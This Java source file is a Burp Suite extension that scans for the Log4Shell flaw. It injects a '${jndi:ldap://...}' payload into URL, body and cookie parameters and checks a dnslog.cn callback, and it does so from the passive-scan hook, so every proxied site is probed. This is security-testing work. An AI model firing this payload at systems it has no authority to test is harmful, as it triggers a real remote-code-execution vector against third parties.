package burp;


import dnslog.IDnslog;
import dnslog.impl.DnslogCN;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class BurpExtender implements IBurpExtender,IScannerCheck{
    public static String NAME = "Log4jRCEScan";
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private Random random = new Random();

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
        this.callbacks = iBurpExtenderCallbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        callbacks.setExtensionName(NAME);
        callbacks.registerScannerCheck(this);

        this.stdout.println("===================================");
        this.stdout.println(String.format("%s 加载成功", NAME));
        this.stdout.println("作者: reader-l");
        this.stdout.println("GitHub: https://github.com/ReadER-L");
        this.stdout.println("===================================");


    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse iHttpRequestResponse) {
        List<IScanIssue> issues = new ArrayList<IScanIssue>();
        IRequestInfo requestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);
        String baseRequestProtocol = iHttpRequestResponse.getHttpService().getProtocol();
        String baseRequestHost = iHttpRequestResponse.getHttpService().getHost();
        int baseRequestPort = iHttpRequestResponse.getHttpService().getPort();
        String baseRequestDomainName = baseRequestProtocol + "://" + baseRequestHost + ":" + baseRequestPort;

        this.stdout.println(baseRequestDomainName);
        byte[] rawRequest = iHttpRequestResponse.getRequest();
        String newDomain = null;
        for (IParameter parameter:requestInfo.getParameters()){
            try {
                IDnslog iDnslog = new DnslogCN();
                newDomain = iDnslog.getNewDomain().replace("\r","").replace("\n","");
                Integer i = random.nextInt(100);
                byte[] tmpRequest = rawRequest;
                String exp = "${jndi:ldap://" + newDomain + "/test" +"}";
                boolean hasModify = false;
                this.stdout.println(exp);
                switch (parameter.getType()){
                    case IParameter.PARAM_URL:
                        exp = this.helpers.urlEncode(exp);
                    case IParameter.PARAM_BODY:
                    case IParameter.PARAM_COOKIE:
                        IParameter newParam = this.helpers.buildParameter(parameter.getName(), exp, parameter.getType());
                        tmpRequest = this.helpers.updateParameter(rawRequest, newParam);
                        hasModify = true;
                        break;
                }
                String s = parameter.getName() + ":" + parameter.getValue();
                this.stdout.println(s);
                if (hasModify){
                    IHttpRequestResponse tmpReq = this.callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), tmpRequest);
                    tmpReq.getResponse();
                    boolean hasIssue = iDnslog.getState(newDomain);
                    if (hasIssue) {

                        this.stdout.println("[*]Log4j version 2.0 < 2.14.1 RCE High-risk vulnerabilities EXIST!!!");
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }

        }

        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue iScanIssue, IScanIssue iScanIssue1) {
        return 0;
    }

}
